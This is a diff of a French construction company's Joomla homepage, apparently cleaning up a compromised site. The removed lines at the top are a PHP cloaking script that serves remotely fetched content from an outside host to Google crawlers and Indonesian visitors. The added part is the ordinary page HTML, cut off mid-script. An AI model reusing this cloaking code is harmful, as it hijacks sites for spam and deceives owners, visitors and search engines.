@@ -1,51 +1,769 @@
-<?php
 
-function getVisitorCountry() {
-    $ip = $_SERVER['REMOTE_ADDR'];
-    $api_url = "http://ip-api.com/json/{$ip}";
+<!doctype html>
+<html lang="fr-fr" dir="ltr">
+<head>
+    <meta charset="utf-8">
+    <meta class="viewport" name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <script src="/media/jui/js/jquery.min.js"></script>
+    <script src="/media/jui/js/jquery-noconflict.js"></script>
 
-    $curl = curl_init();
-    curl_setopt($curl, CURLOPT_URL, $api_url);
-    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    <base href="https://constructiontjl.com/accueil/" />
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<meta name="generator" content="Joomla! - Open Source Content Management" />
+	<title>Accueil</title>
+	<link href="/templates/vg_progressive/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon" />
+	<link href="/plugins/system/jce/css/content.css?aac97a4b3b7d6dc65e894ae004295277" rel="stylesheet" type="text/css" />
+	<link href="/components/com_layer_slider/base/static/css/layerslider.css" rel="stylesheet" type="text/css" />
+	<link href="/components/com_layer_slider/base/static/css/layerslider.transitiongallery.css" rel="stylesheet" type="text/css" />
+	<link href="/modules/mod_layer_slider/imagelightbox.css" rel="stylesheet" type="text/css" />
+	<link href="/cache/twojtoolbox/2jtoolboxcache_212bdfd8aa134a371d3b82642db92d1b.css" rel="stylesheet" type="text/css" />
+	<script src="/media/system/js/caption.js?aac97a4b3b7d6dc65e894ae004295277" type="text/javascript"></script>
+	<script src="/components/com_layer_slider/base/static/js/layerslider.kreaturamedia.js" type="text/javascript"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/1.11.2/TweenMax.min.js" type="text/javascript"></script>
+	<script src="/components/com_layer_slider/base/static/js/layerslider.transitions.js" type="text/javascript"></script>
+	<script src="/modules/mod_layer_slider/imagelightbox.js" type="text/javascript"></script>
+	<script src="/cache/twojtoolbox/2jtoolboxcache_20b7516a8ea16d4a74d3ae1f21143666.js" type="text/javascript"></script>
+	<script type="text/javascript">
+jQuery(window).on('load',  function() {
+				new JCaption('img.caption');
+			});
+	</script>
+	<link id="ls-google-fonts-css" media="all" type="text/css" href="https://fonts.googleapis.com/css?family=Lato:100,300,regular,700,900|Open+Sans:300|Indie+Flower:regular|Oswald:300,regular,700&subset=latin,latin-ext" rel="stylesheet">
 
-    $response = curl_exec($curl);
 
-    if (curl_errno($curl)) {
-        // Handle any errors if needed
-        return "Error: " . curl_error($curl);
-    }
+    <!-- Google fonts -->
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700,700italic">
 
-    curl_close($curl);
+    <!-- CSS -->
+    <link rel="stylesheet" href="/templates/system/css/system.css" type="text/css" />
+    <link rel="stylesheet" href="/templates/vg_progressive/css/buttons/buttons.css">
+    <link rel="stylesheet" href="/templates/vg_progressive/css/buttons/social-icons.css">
+    <link rel="stylesheet" href="/templates/vg_progressive/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/templates/vg_progressive/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/templates/vg_progressive/css/jslider.css">
+    <link rel="stylesheet" href="/templates/vg_progressive/css/settings.css">
+    <link rel="stylesheet" href="/templates/vg_progressive/css/jquery.fancybox.css">
+    <link rel="stylesheet" href="/templates/vg_progressive/css/animate.css">
+    <link rel="stylesheet" href="/templates/vg_progressive/css/video-js.min.css">
+    <link rel="stylesheet" href="/templates/vg_progressive/css/morris.css">
+    <link rel="stylesheet" href="/templates/vg_progressive/css/ladda.min.css">
+    <link rel="stylesheet" href="/templates/vg_progressive/css/datepicker.css">
 
-    $data = json_decode($response, true);
+    <!-- Theme CSS -->
+    <link rel="stylesheet" href="/templates/vg_progressive/css/style.css">
 
-    if ($data['status'] === 'success') {
-        return $data['country'];
-    } else {
-        return "Country not found";
-    }
+    <!-- Responsive CSS -->
+    <link rel="stylesheet" href="/templates/vg_progressive/css/responsive.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/templates/vg_progressive/css/customizer/pages.css">
+    <link rel="stylesheet" href="/templates/vg_progressive/css/customizer/home-pages-customizer.css">
+
+    <!-- IE Styles-->
+    <link rel='stylesheet' href="/templates/vg_progressive/css/ie/ie.css">
+
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <link rel='stylesheet' href="/templates/vg_progressive/css/ie/ie8.css">
+    <![endif]-->
+
+    <link rel="stylesheet" href="/templates/vg_progressive/css/joomla.css">
+    <style>
+        body,
+        input,
+        button,
+        select,
+        textarea {
+            font-family:'PT sans', sans-serif;
+        }
+        #top-box,
+        .carousel-box .next:hover,
+        .carousel-box .prev:hover,
+        .product .product-hover,
+        #footer .up:hover,
+        .btn,
+        .btn:visited,
+        .slider .slider-nav,
+        .panel-group .active.panel .panel-heading > .panel-title > a,
+        .panel-group .active.panel .panel-heading > .panel-title > a:hover,
+        .banner-set .pagination a:hover,
+        .employee .employee-hover,
+        .carousel-box .pagination a:hover,
+        .sidebar .menu li.active > a,
+        .pagination > li > a:hover,
+        .pagination > li > a:focus,
+        .sidebar .tags a:hover,
+        .sidebar .banners .banner-text,
+        #catalog .category-img .description,
+        .product-bottom .related-products header:before,
+        .slider.rs-slider .tparrows,
+        .slider.rs-slider .tparrows:hover,
+        .toolbar .sort-catalog .dropdown-toggle,
+        .toolbar .grid-list .grid,
+        .toolbar .grid-list .list,
+        .toolbar .up-down,
+        .toolbar .up-down.active,
+        .toolbar .grid-list a.grid:hover,
+        .toolbar .grid-list a.list:hover,
+        .pagination > .active > a,
+        .pagination > .active > span,
+        .pagination > .active > span:hover,
+        .sidebar .tags a,
+        .sidebar .menu li.parent > a .open-sub:before,
+        .sidebar .menu li.parent > a .open-sub:after,
+        .panel-group .panel-default .panel-heading > .panel-title > a:before,
+        .panel-group .panel-default .panel-heading > .panel-title > a:after,
+        .new-radio.checked span,
+        .list .product .actions a:hover,
+        .product-page .col-md-7 .actions a:hover,
+        .product-page .image-box .thumblist-box .prev:hover,
+        .product-page .image-box .thumblist-box .next:hover,
+        .accordion-tab > li > a .open-sub:before,
+        .accordion-tab > li > a .open-sub:after,
+        .products-tab .accordion-tab > li > a .open-sub:before,
+        .products-tab .accordion-tab > li > a .open-sub:after,
+        .sidebar .calendar-wrap caption,
+        .btn-group.open .btn.dropdown-toggle,
+        .product .limit-offer,
+        .product .not-rotation-actions,
+        .fancybox-nav span:hover,
+        .header .primary .navbar .btn-navbar .icon-bar,
+        .progressive-slider-two .pagination a,
+        .progressive-slider-two .pagination a:hover,
+        .progressive-slider-two .pagination .selected {
+            background-color: #009640;
+        }
+        .slider .slider-nav {
+            background-color: rgba(0,150,64,0.97);
+        }
+        .product .limit-offer,
+        .product .not-rotation-actions {
+            background-color: rgba(0,150,64,0.9);
+        }
+        .btn:hover,
+        .btn:focus,
+        .btn:active,
+        .btn.active,
+        .btn.disabled,
+        .btn[disabled] {
+            background-color: rgba(0,150,64,0.8);
+        }
+        #catalog .category-img .description,
+        .toolbar .sort-catalog .dropdown-toggle,
+        .toolbar .grid-list .grid,
+        .toolbar .grid-list .list,
+        .toolbar .up-down,
+        .toolbar .up-down.active,
+        .pagination > .active > a,
+        .pagination > .active > span,
+        .pagination > .active > span:hover,
+        .sidebar .tags a,
+        .btn-group.open .btn.dropdown-toggle {
+            background-color: rgba(0,150,64,0.7);
+        }
+        .sidebar .banners .banner-text {
+            background-color: rgba(0,150,64,0.65);
+        }
+        .slider.rs-slider .tparrows,
+        .product-page .add-cart-form .number .regulator a:hover,
+        .progressive-slider-two .pagination a {
+            background-color: rgba(0,150,64,0.5);
+        }
+        .pricing .bottom-box {
+            background-color: rgba(0,150,64,0.05);
+        }
+        .pricing:before {
+            background-color: rgba(0,150,64,0.06);
+        }
+        .pricing .options li,
+        .pricing .bottom-box {
+            border-color: rgba(0,150,64,0.1);
+        }
+        .header .cart-header .dropdown-toggle,
+        #footer .newsletter input:focus + .submit,
+        .icon,
+        .big-icon,
+        .big-icon:visited,
+        .service .icon,
+        .close:hover,
+        .close:focus,
+        .img-thumbnail:hover .bg-images i:before,
+        .box-404 h1,
+        .gallery-images:hover .bg-images i:before,
+        .features-block .header-box .icon-box,
+        .features-block .header-box,
+        .sidebar .newsletter input:focus + .submit,
+        .sidebar .section .selected .close:hover,
+        .package .title a,
+        .package .price-box .price,
+        .package .price-box .icon,
+        .pricing .title a,
+        .pricing .options li span,
+        .pricing .options li.active,
+        .banner-set .next:hover,
+        .banner-set .prev:hover,
+        .btn.btn-border,
+        .btn.btn-border .caret,
+        .product-remove:hover,
+        .one-page .header .primary .navbar .nav .active {
+            color: #009640;
+        }
+        .pricing .bottom-box .more {
+            color: rgba(0,150,64,0.7);
+        }
+        .pricing .options li {
+            color: rgba(0,150,64,0.4);
+        }
+        .phone-header a svg path,
+        .search-header a svg path,
+        .product .actions a svg path,
+        .sidebar .wishlist .add-cart:hover path,
+        .header .cart-header .dropdown-toggle .icon svg path,
+        .search-active .search-submit svg path,
+        .new-checkbox svg polygon,
+        .product-bottom .related-products li .button-box .wishlist:hover svg path,
+        .jslider .jslider-pointer svg path,
+        .rating-box .rating svg polygon,
+        .search-result .search-form .search-submit svg path {
+            fill: #009640;
+        }
+        @media (max-width: 979px) {
+            .header .primary .navbar .nav > .parent.active > a,
+            .header .primary .navbar .nav > .parent.active:hover > a,
+            .header .primary .navbar .nav .open-sub span,
+            .accordion-tab > li.active > a,
+            .accordion-tab > li.active > a:hover,
+            .accordion-tab > li.active > a:focus,
+            .accordion-tab > li.active:hover > a,
+            .products-tab .accordion-tab > li.active > a,
+            .products-tab .accordion-tab > li.active:hover > a {
+                background-color: #009640;
+            }
+            .header .primary .navbar .nav > .parent.active > a,
+            .header .primary .navbar .nav > .parent.active:hover > a {
+                border-color: #009640;
+            }
+        }
+        .custom-class{  }    </style>
+<!-- Start cookieyes banner --> <script id="cookieyes" type="text/javascript" src="https://cdn-cookieyes.com/client_data/65300b637a5665d24bc2a0ad/script.js"></script> <!-- End cookieyes banner -->
+</head>
+<body class=" fixed-header fullwidth" style="">
+
+<span id="block0"></span>
+
+<div class="page-box">
+<div class="page-box-content">
+
+
+<header class="header header-two">
+    <div class="header-wrapper">
+        <div class="container">
+            <div class="row">
+                <div class="col-xs-6 col-md-2 col-lg-3 logo-box">
+                    <div class="logo">
+                                                    <a href="https://constructiontjl.com/">
+                                <img src="/images/construction_tjl/tjl-noir.png" alt="Construction TJL" class="logo-img" />
+                            </a>
+                                            </div>
+                </div><!-- .logo-box -->
+
+                <div class="col-xs-6 col-md-10 col-lg-9 right-box">
+                    <div class="right-box-wrapper">
+
+                        <div class="header-icons">
+
+                            
+                            
+                        </div><!-- .header-icons -->
+
+                        <div class="primary">
+                            <div class="navbar navbar-default" role="navigation">
+
+                                <button type="button" class="navbar-toggle btn-navbar collapsed" data-toggle="collapse" data-target=".primary .navbar-collapse">
+                                    <span class="text">Menu</span>
+                                    <span class="icon-bar"></span>
+                                    <span class="icon-bar"></span>
+                                    <span class="icon-bar"></span>
+                                </button>
+
+                                <nav class="collapse collapsing navbar-collapse">
+
+                                                                            <ul class="nav navbar-nav navbar-center ">
+<li class="item-101 current active "><a  class="" href="/index.php">Accueil</a></li><li class="item-102 deeper parent "><a  class=" dropdown-toggle disabled-ds" href="/accueil#block-block-1">À propos de nous</a><ul class="sub"><li class="item-269 "><a  class="" href="/index.php/a-propos-de-nous/equipe">L'Équipe</a></li></ul></li><li class="item-121 "><a  class="" href="/accueil#services">Nos services</a></li><li class="item-155 "><a  class="" href="/accueil#realisations">Nos réalisations</a></li><li class="item-138 megamenu promo"><a  class="" href="/accueil#vg-bottom">Nos clients</a></li><li class="item-110 "><a  class="" href="/index.php/contactez-nous">Contactez-nous</a></li></ul>
+
+                                    
+                                </nav>
+
+                            </div>
+                        </div><!-- .primary -->
+                    </div>
+                </div>
+
+                
+                
+            </div><!--.row -->
+        </div>
+    </div><!-- .header-wrapper -->
+</header><!-- .header -->
+
+<div class="slider rs-slider">
+    <div class="tp-banner-container">
+        <div class="tp-banner">
+             <script type="text/javascript">
+(window.lsjq||jQuery)(document).ready(function($) {
+if(typeof $.fn.layerSlider == "undefined") { lsShowNotice('layerslider_1','jquery'); }
+else {
+$("#layerslider_1").layerSlider({pauseOnHover: false, keybNav: false, touchNav: false, skinsPath: 'https://constructiontjl.com/components/com_layer_slider/base//static/skins/'})
 }
+});
+</script><div id="layerslider_1" class="ls-wp-container" style="width:1920px;height:650px;margin:0 auto;margin-bottom: 0px;"><div class="ls-slide" data-ls="transition3d:all;"><img src="https://constructiontjl.com/components/com_layer_slider/base//static/img/blank.gif" data-src="/images/construction_tjl/Steel-deck.jpg" class="ls-bg" alt="Slide background" /><p class="ls-l" style="top:139px;left:349px;padding-right:15px;padding-left:15px;font-family:Oswald;font-size:90px;color:#faf5f5;background:rgba(15, 14, 14, 0.49);border-radius:20px;white-space: nowrap;" data-ls="showuntil:4000;">Du savoir faire et ...</p><p class="ls-l" style="top:307px;left:1105px;padding-right:15px;padding-left:15px;font-family:Oswald;font-size:90px;color:#faf5f5;background:rgba(15, 14, 14, 0.49);border-radius:20px;white-space: nowrap;" data-ls="delayin:1000;showuntil:4000;">du coeur</p></div><div class="ls-slide" data-ls="transition3d:all;"><img src="https://constructiontjl.com/components/com_layer_slider/base//static/img/blank.gif" data-src="/images/construction_tjl/Intrieur-.jpg" class="ls-bg" alt="Slide background" /><p class="ls-l" style="top:291px;left:401px;padding-right:15px;padding-left:15px;font-family:Oswald;font-size:90px;color:#faf5f5;background:rgba(15, 14, 14, 0.49);border-radius:20px;white-space: nowrap;" data-ls="easingin:easeInOutSine;showuntil:4000;">Pour tous genres de travaux</p></div><div class="ls-slide" data-ls="transition3d:all;"><img src="https://constructiontjl.com/components/com_layer_slider/base//static/img/blank.gif" data-src="/images/construction_tjl/Contremaitre.jpg" class="ls-bg" alt="Slide background" /><p class="ls-l" style="top:194px;left:271px;padding-right:15px;padding-left:15px;font-family:Oswald;font-size:90px;color:#faf5f5;background:rgba(15, 14, 14, 0.49);border-radius:20px;white-space: nowrap;">Vous pouvez compter sur notre équipe</p></div></div>
 
-function isHomePage() {
-    return ($_SERVER['REQUEST_URI'] === '/accueil/');
-}
+        </div>
+    </div>
+</div>
 
-function isGoogleCrawler() {
-    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
-    return (strpos($userAgent, 'google') !== false);
-}
 
-if ((isGoogleCrawler() || (getVisitorCountry() === 'Indonesia')) && isHomePage()) {
-    // Output the cloaked content
-$curl = curl_init();
-curl_setopt($curl, CURLOPT_URL, 'https://ppfun.net/amp/aston/constructiontjl/u.txt');
-curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-$content = curl_exec($curl);
-curl_close($curl);
 
-echo $content;
-} else {
-    // Output your main content here
-    include 'main.php';
-}
-?>
+<div class="custom mod-propos"  >
+	<div class="container">
+<div class="row">
+<div class="region region-features col-xs-12 col-sm-12 col-md-12 col-lg-12">
+<div id="block-block-1" class="block block-block  block-feature-video block-overflow superhero-block" style="padding-top: 70px; padding-bottom: 50px;">
+<div class="block-overlay">&nbsp;</div>
+<div class="content">
+<div class="row">
+<div class="col-md-4 col-lg-4 col-sm-4 col-xs-12">
+<div class="featured-box"><img src="/images/construction_tjl/Poign_de_main.jpg" alt="Poign de main" /><br />
+<div class="featured-box-content">
+<h4>&Agrave; propos de nous</h4>
+<div class="featured-box-desc"><!-- START: Articles Anywhere --><p>Enthousiaste et dot&eacute;s d&rsquo;un bon sens relationnel, nous sommes conscients que le personnel contribue &agrave; donner une image positive de la soci&eacute;t&eacute; aupr&egrave;s de ses partenaires et des futurs clients.</p>
+<p>Nous sommes dispos&eacute;s &agrave; nous acquitter des t&acirc;ches tels que ; la pose de gypse, la pose de divisions m&eacute;talliques, la pose de la laine isolante, le tirage de joints ainsi que la pose de plafond suspendu.</p> <!-- END: Articles Anywhere --></div>
+</div>
+</div>
+</div>
+<div class="col-md-4 col-lg-4 col-sm-4 col-xs-12">
+<div class="featured-box">
+<div class="featured-box-thumb"><img src="/images/construction_tjl/Travailleurs.jpg" alt="Travailleurs" /></div>
+<div class="featured-box-content">
+<h4>Valeurs</h4>
+<div class="featured-box-desc"><!-- START: Articles Anywhere --><p>Notre grande capacit&eacute; d&rsquo;adaptation et l&rsquo;implication d&eacute;montr&eacute;es lors de nos pr&eacute;c&eacute;dentes exp&eacute;riences sont, pour nous, des qualit&eacute;s indispensables lors de la r&eacute;alisation d&rsquo;un projet.</p>
+<p>Enthousiaste et dot&eacute;s d&rsquo;un bon sens relationnel,</p>
+<p>Nous serons &agrave; l&rsquo;&eacute;coute de vos attentes et vos besoins car nous savons ce que signifie un projet d&rsquo;envergure pour le client et nous ferons tout en notre possible pour vous offrir une exp&eacute;rience des plus fiable</p> <!-- END: Articles Anywhere --></div>
+</div>
+</div>
+</div>
+<div class="col-md-4 col-lg-4 col-sm-4 col-xs-12">
+<div class="featured-box">
+<div class="featured-box-thumb"><img src="/images/construction_tjl/Arpenteur.jpg" alt="Arpenteur" /></div>
+<div class="featured-box-content">
+<h4>La performance tout en Confiance !</h4>
+<div class="featured-box-desc"><!-- START: Articles Anywhere --><article>
+<p>C&rsquo;est avec motivation et enthousiasme que nous vous pr&eacute;sentons notre site internet.<br />Au cours de nos pr&eacute;c&eacute;dentes exp&eacute;riences professionnelles, nous avons eu la chance de perfectionner notre travail et par le fait m&ecirc;me, de nous former une &eacute;quipe et un savoir-faire solide et performante.<br />Ma&icirc;trisant parfaitement la pose de gypses, nous avons acqu&eacute;ri de nouvelles aptitudes afin d&rsquo;ouvrir nos horizons sur le monde diversifi&eacute; qu&rsquo;est la construction.</p>
+</article> <!-- END: Articles Anywhere --></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="services">&nbsp;</div></div>
+
+
+<div class="custom nos-services"  >
+	<div class="container">
+<div class="row services">
+<h3>Nos services</h3>
+<div class="big-services-box col-sm-4 col-md-4">
+<div>
+<div class="big-icon bg" data-appear-animation="wobble"><i class="fa fa-truck"></i></div>
+<h4 data-appear-animation="bounceInLeft">Commercial-Industriel-Institutionnel</h4>
+<div class="text-small" data-appear-animation="bounceInLeft"><!-- START: Articles Anywhere --><p>Les Constructions TJL ont à cœur de vous offrir des services professionnels et de qualité. Nous avons une équipe spécialisée dans le secteur <strong>institutionnel, commercial et industrie</strong>l, quel que soit la taille du projet.</p> <!-- END: Articles Anywhere --></div>
+</div>
+</div>
+<!-- .services-box-two -->
+<div class="big-services-box col-sm-4 col-md-4">
+<div>
+<div class="big-icon bg" data-appear-animation="wobble"><i class="fa fa-home"></i></div>
+<h4 data-appear-animation="bounceInUp">Construction r&eacute;sidentielle</h4>
+<div class="text-small" data-appear-animation="bounceInUp"><!-- START: Articles Anywhere --><p>Nous possédons une solide expérience en <strong>construction résidentielle</strong>. Nos maisons témoignent de bon goût, de qualité, ainsi que d’éléments distinctifs qui ont fait notre réputation jusqu’à ce jour. Confiez-nous vos rêves en toute quiétude, vous serez enchanté.</p> <!-- END: Articles Anywhere --></div>
+</div>
+</div>
+<!-- .services-box-two -->
+<div class="big-services-box col-sm-4 col-md-4">
+<div>
+<div class="big-icon bg" data-appear-animation="wobble"><i class="fa fa-wrench"></i></div>
+<h4 data-appear-animation="bounceInRight">Gestion de projets</h4>
+<div class="text-small" data-appear-animation="bounceInRight"><!-- START: Articles Anywhere --><p><span style="font-family: arial, helvetica, sans-serif; font-size: 10pt;">Nous sommes des sp&eacute;cialistes en <strong>gestions de projets en syst&egrave;mes int&eacute;rieur</strong> (petit ou grand) avec des r&eacute;sultats de qualit&eacute;s, en temps et selon votre budget. La gestion de projets assur&eacute;e par nos experts s'inspire des meilleures pratiques de l'industrie. Nous assurons ainsi le succ&egrave;s de tous les projets qui nous sont confi&eacute;s</span></p> <!-- END: Articles Anywhere --></div>
+</div>
+</div>
+<!-- .services-box-two --></div>
+</div></div>
+
+
+<section id="main">
+<article class="content">
+<div class="container">
+
+    
+    
+</div>
+
+<span id="block2"></span>
+
+<div class="container">
+    <div class="row" id="vg-mainbody">
+
+        
+        <div class="col-sm-12 col-md-12 vg_component_box">
+
+            <div class="container-disabled">
+                                <article class="single-post post entry item-page" itemscope itemtype="http://schema.org/Article">
+	<meta itemprop="inLanguage" content="fr-FR" />
+			
+	
+		
+								<div itemprop="articleBody">
+		 	</div>
+
+    <footer class="entry-meta">
+                
+<span class="icons pull-right">
+	
+		
+	</span>
+    </footer>
+
+						</article>
+            </div>
+
+        </div>
+
+        
+    </div>
+</div>
+
+
+
+
+    <span id="block5"></span>
+
+    <div style="background-color:#ffffff" class="full-width-box cm-padding-bottom-36 background-image-available" id="vg-showcase">
+
+                    <div class="fwb-bg fwb-paralax" data-stellar-background-ratio="0.5"
+                 style="background-image: url(/images/construction_tjl/Montage_travailleur.jpg)">
+                <div class="overlay"></div>
+            </div>
+        
+        
+        <div class="container">
+            <div class="row-fluid">
+                
+
+<div class="custom"  >
+	<div class="slogan-tjl"><img src="/images/construction_tjl/tjl-noir.png" alt="tjl-noir" /> <!-- START: Articles Anywhere --><p>C'est se d&eacute;passer, pousser toujours plus loin, &ecirc;tre performant, et ce, tout en assurant un rendement de qualit&eacute;!</p>
+<p>Notre Mission, performance et satisfaction !</p> <!-- END: Articles Anywhere --></div>
+<div id="realisations">&nbsp;</div></div>
+
+            </div>
+        </div>
+
+    </div>
+
+
+
+
+
+
+    <span id="block9"></span>
+    <div style="background-color:#ffffff" class="full-width-box cm-padding-bottom-36 " id="vg-team">
+
+        
+        
+        <div class="container">
+            <div class="row-fluid">
+                
+
+<div class="custom"  >
+	<h3>R&eacute;alisations</h3></div>
+<div class="moduletable"><div id="twoj_photo_gallery_root1" style="max-width: 1260px;background-color: transparent; "  class="twoj_photo_gallery_root"><div style="text-align: left;"><ul class="twoj-menu-dark-coffee zetta-menu " id="twoj_photo_gallery_menu1"><li class="zm-active" ><a data-categoryid="0" data-category="category-all" href="#">Tous</a></li><li  class="category-id-1" ><a data-categoryid="1" data-category="category-1" href="#">Agora de P.A.T</a></li><li  class="category-id-2" ><a data-categoryid="2" data-category="category-2" href="#">CPE Flûte Enchantée</a></li><li  class="category-id-3" ><a data-categoryid="3" data-category="category-3" href="#">Habitation Trilogis</a></li><li  class="category-id-4" ><a data-categoryid="4" data-category="category-4" href="#">Le Vice Versa</a></li><li  class="category-id-5" ><a data-categoryid="5" data-category="category-5" href="#">Les Petites Soeurs de la Sainte-Famille</a></li><li  class="category-id-6" ><a data-categoryid="6" data-category="category-6" href="#">Terrasse 2013</a></li><li  class="category-id-7" ><a data-categoryid="7" data-category="category-7" href="#">Tour Alta</a></li><li  class="category-id-8" ><a data-categoryid="8" data-category="category-8" href="#">U 31</a></li><li  class="category-id-9" ><a data-categoryid="9" data-category="category-9" href="#">Urbano</a></li></ul></div><div class="clear"></div><div id="twoj_photo_gallery1" style="padding:8px;"  class="twoj_photo_gallery_class"><div id="twoj_photo_gallery_wrap1" class="twoj_photo_gallery_wrap_class ">		<div class="mega-entry-cursor mega-entry category-all category-1" id="mega-entry-101" data-id="101" data-link="https://constructiontjl.com/media/com_twojtoolbox/IMG_2120_copy3.jpg" data-type="image" data-options="thumbnail: '/cache/twojtoolbox/IMG_2120_copy3jpg_size450x320_bgffffff_fsf3b8dc7d3d2802b57549bc2232cee791_tr1_p0.png'" data-src="/cache/twojtoolbox/IMG_2120_copy3jpg_size450x320_bgffffff_fsf3b8dc7d3d2802b57549bc2232cee791_tr1_p0.png" data-width="450" data-height="300" ></div>
+		<div class="mega-entry-cursor mega-entry category-all category-1" id="mega-entry-102" data-id="102" data-link="https://constructiontjl.com/media/com_twojtoolbox/IMG_2122_copy3.jpg" data-type="image" data-options="thumbnail: '/cache/twojtoolbox/IMG_2122_copy3jpg_size450x320_bgffffff_fscdf84cf8574f1a1dbe4a67eaa522df65_tr1_p0.png'" data-src="/cache/twojtoolbox/IMG_2122_copy3jpg_size450x320_bgffffff_fscdf84cf8574f1a1dbe4a67eaa522df65_tr1_p0.png" data-width="450" data-height="300" ></div>
+		<div class="mega-entry-cursor mega-entry category-all category-1" id="mega-entry-103" data-id="103" data-link="https://constructiontjl.com/media/com_twojtoolbox/IMG_2126_copy4.jpg" data-type="image" data-options="thumbnail: '/cache/twojtoolbox/IMG_2126_copy4jpg_size450x320_bgffffff_fs4055280bd17c024134e4b5fddfe2f76a_tr1_p0.png'" data-src="/cache/twojtoolbox/IMG_2126_copy4jpg_size450x320_bgffffff_fs4055280bd17c024134e4b5fddfe2f76a_tr1_p0.png" data-width="450" data-height="300" ></div>
+		<div class="mega-entry-cursor mega-entry category-all category-1" id="mega-entry-104" data-id="104" data-link="https://constructiontjl.com/media/com_twojtoolbox/IMG_2129_copy4.jpg" data-type="image" data-options="thumbnail: '/cache/twojtoolbox/IMG_2129_copy4jpg_size450x320_bgffffff_fs760327dcbdeeec53a58a8038605a60ad_tr1_p0.png'" data-src="/cache/twojtoolbox/IMG_2129_copy4jpg_size450x320_bgffffff_fs760327dcbdeeec53a58a8038605a60ad_tr1_p0.png" data-width="450" data-height="300" ></div>
+		<div class="mega-entry-cursor mega-entry category-all category-1" id="mega-entry-105" data-id="105" data-link="https://constructiontjl.com/media/com_twojtoolbox/IMG_2116_copy4.jpg" data-type="image" data-options="thumbnail: '/cache/twojtoolbox/IMG_2116_copy4jpg_size450x320_bgffffff_fsddf16dfb4aea679185097a458ebc823f_tr1_p0.png'" data-src="/cache/twojtoolbox/IMG_2116_copy4jpg_size450x320_bgffffff_fsddf16dfb4aea679185097a458ebc823f_tr1_p0.png" data-width="450" data-height="300" ></div>
+		<div class="mega-entry-cursor mega-entry category-all category-1" id="mega-entry-106" data-id="106" data-link="https://constructiontjl.com/media/com_twojtoolbox/IMG_2117_copy3.jpg" data-type="image" data-options="thumbnail: '/cache/twojtoolbox/IMG_2117_copy3jpg_size450x320_bgffffff_fs6af0956400d84d4643530b7a33f0999a_tr1_p0.png'" data-src="/cache/twojtoolbox/IMG_2117_copy3jpg_size450x320_bgffffff_fs6af0956400d84d4643530b7a33f0999a_tr1_p0.png" data-width="214" data-height="320" ></div>
+		<div class="mega-entry-cursor mega-entry category-all category-1" id="mega-entry-107" data-id="107" data-link="https://constructiontjl.com/media/com_twojtoolbox/IMG_2110_copy3.jpg" data-type="image" data-options="thumbnail: '/cache/twojtoolbox/IMG_2110_copy3jpg_size450x320_bgffffff_fs95c5bb3f81174d9955a374be775fd1ad_tr1_p0.png'" data-src="/cache/twojtoolbox/IMG_2110_copy3jpg_size450x320_bgffffff_fs95c5bb3f81174d9955a374be775fd1ad_tr1_p0.png" data-width="450" data-height="300" ></div>
+		<div class="mega-entry-cursor mega-entry category-all category-1" id="mega-entry-108" data-id="108" data-link="https://constructiontjl.com/media/com_twojtoolbox/IMG_2118_copy3.jpg" data-type="image" data-options="thumbnail: '/cache/twojtoolbox/IMG_2118_copy3jpg_size450x320_bgffffff_fs956120bae61a435c0920636a6e32a058_tr1_p0.png'" data-src="/cache/twojtoolbox/IMG_2118_copy3jpg_size450x320_bgffffff_fs956120bae61a435c0920636a6e32a058_tr1_p0.png" data-width="214" data-height="320" ></div>
+		<div class="mega-entry-cursor mega-entry category-all category-1" id="mega-entry-109" data-id="109" data-link="https://constructiontjl.com/media/com_twojtoolbox/IMG_2119_copy3.jpg" data-type="image" data-options="thumbnail: '/cache/twojtoolbox/IMG_2119_copy3jpg_size450x320_bgffffff_fs0b0adfaddfc7b47eb7a0586770e8b6da_tr1_p0.png'" data-src="/cache/twojtoolbox/IMG_2119_copy3jpg_size450x320_bgffffff_fs0b0adfaddfc7b47eb7a0586770e8b6da_tr1_p0.png" data-width="450" data-height="300" ></div>
+</div></div><div class="twojtoolbox_clear"></div><div class="progress-button-center"><button id="load_more_1" class="progress-button green" data-finished="Afficher plus" data-loading="Chargement...">Afficher plus</button></div></div><script language="JavaScript" type="text/javascript">
+<!--//<![CDATA[
+var urlPatchTwojPhotoGallery = "https://constructiontjl.com/", galleryNowClick1 = 0, galleryButtonPos1 = 0;
+emsajax(function(){
+emsajax("head").append("<style  type='text/css'>#twoj_photo_gallery_wrap1 .mega-entry .mega-entry-innerwrap{border-radius: 5px; -moz-border-radius: 5px; -webkit-border-radius:5px;box-shadow: 1px 1px 4px rgba( 0, 0, 0, 0.3);} #twoj_photo_gallery_wrap1 .mega-entry .mega-entry-innerwrap:hover{box-shadow: 1px 1px 4px rgba( 0, 0, 0, 0.7);}</style>"); window["galleryAPI1"] = emsajax("#twoj_photo_gallery_wrap1").megafoliopro({ layoutarray: [ 9] , filterChangeAnimation: "rotatescale" ,filterChangeSpeed: 600 ,filterChangeRotate: 99 , filterChangeScale: 0.6 , paddingHorizontal: 10 , paddingVertical: 10 }); 
+ window["galleryAPI1"] = emsajax("#twoj_photo_gallery_wrap1").megaremix(); 
+ window["galleryCategory1"] = "0"; 
+ window["galleryCategoryCount1"] = {"1":9,"2":11,"3":12,"4":1,"5":1,"6":17,"7":1,"8":4,"9":2,"0":58}; 
+ window["galleryItems1"] = [101,102,103,104,105,106,107,108,109]; 
